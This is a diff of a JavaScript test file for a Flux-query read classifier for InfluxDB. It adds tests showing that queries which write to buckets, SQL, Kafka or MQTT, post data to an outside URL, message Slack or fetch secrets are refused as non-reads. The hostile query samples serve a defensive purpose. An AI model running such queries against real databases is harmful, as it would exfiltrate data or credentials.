@@ -38,12 +38,43 @@ describe('InfluxDB read classification', () => {
     expect(a.maxRows).toBe(50000);
   });
 
-  it('refuses a Flux body that writes points back with to()', () => {
-    /* query_data is a read by operation name only; Flux to() writes into a bucket. */
-    const a = flux('from(bucket:"a") |> range(start:-1h) |> to(bucket:"b")');
-    expect(a.provenRead).toBe(false);
-    expect(a.reason).toMatch(/to\(\)/);
-    expect(flux('from(bucket:"a") |> range(start:-1h) |> experimental.to(bucket:"b")').provenRead).toBe(false);
+  it('refuses the whole Flux writer family, not just the two unqualified names', () => {
+    /* query_data is a read by operation name only. The writers are package-qualified, and an earlier
+       detector excluded a preceding dot to avoid matching user data — which let every qualified
+       writer through. Flux records have no methods, so a qualified `.to(` is always a package call. */
+    const writers = [
+      'to(bucket:"b")',
+      'experimental.to(bucket:"b")',
+      'experimental.wideTo(bucket:"b")',
+      'sql.to(driverName:"postgres", dataSourceName:"x", table:"t")',
+      'kafka.to(brokers:["b:9092"], topic:"t")',
+      'mqtt.to(broker:"tcp://b:1883")',
+    ];
+    for (const writer of writers) {
+      const a = flux(`from(bucket:"a") |> range(start:-1h) |> ${writer}`);
+      expect(a.provenRead, writer).toBe(false);
+    }
+  });
+
+  it('refuses a body importing a package that can send data out or read secrets', () => {
+    /* http.post/slack.message exfiltrate; secrets.get pulls credentials into the result. Each needs
+       an explicit import, so gating on the import catches the call however it is aliased. */
+    const egress = [
+      ['http', 'http.post(url:"http://example.com", data:bytes(v:"x"))'],
+      ['slack', 'slack.message(text:"x")'],
+      ['influxdata/influxdb/secrets', 'secrets.get(key:"token")'],
+    ];
+    for (const [pkg, call] of egress) {
+      const a = flux(`import "${pkg}"\nfrom(bucket:"a") |> range(start:-1h) |> ${call}`);
+      expect(a.provenRead, pkg).toBe(false);
+      expect(a.reason, pkg).toMatch(/send data out of InfluxDB or read secrets/);
+    }
+  });
+
+  it('still allows a read that imports a harmless package', () => {
+    /* The import gate must not refuse the helpers real read queries use. */
+    expect(flux('import "date"\nfrom(bucket:"t") |> range(start:-1h) |> limit(n:5)').provenRead).toBe(true);
+    expect(flux('import "influxdata/influxdb/schema"\nschema.fieldKeys(bucket:"t") |> limit(n:5)').provenRead).toBe(true);
   });
 
   it('does not mistake a column or function named *to* for a write', () => {
